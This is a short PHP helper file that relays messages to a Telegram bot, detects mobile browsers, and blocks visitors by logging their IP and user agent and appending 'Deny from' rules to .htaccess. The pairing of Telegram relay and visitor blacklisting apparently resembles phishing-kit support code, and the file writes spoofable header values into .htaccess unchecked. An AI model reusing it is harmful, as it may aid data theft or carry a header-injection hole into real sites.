<?php
function sendTg($msg, $key, $id) {
   $apiToken = $key;
   $data = [
        'chat_id' => $id,
       'text' => $msg
   ];
   $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data)."&parse_mode=html");
}

function isMobile() {
	return preg_match("/(android|webos|avantgo|iphone|ipad|ipod|blackberry|iemobile|bolt|boost|cricket|docomo|fone|hiptop|mini|opera mini|kitkat|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}


function block(){
   if (isset($_SERVER['HTTP_CLIENT_IP'])) {
           $ip = $_SERVER['HTTP_CLIENT_IP'];
   }
   elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
           $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
   }
   elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
           $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
   }
   else {
           $ip = $_SERVER['REMOTE_ADDR'];
   }
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
   $zCh = fopen("../sistema/listaNegra/blocked_ip.txt", "a");
   fwrite($zCh, $ip . "\n");
   fclose($zCh);
   $ChB = fopen("../sistema/listaNegra/blocked_ua.txt", "a");
   fwrite($ChB, $user_agent . "\n");
   fclose($ChB);	
   $optional = fopen("../.htaccess", "a");
   fwrite($optional, "Deny from " . $ip . "\n");
   fclose($optional);
}  
?>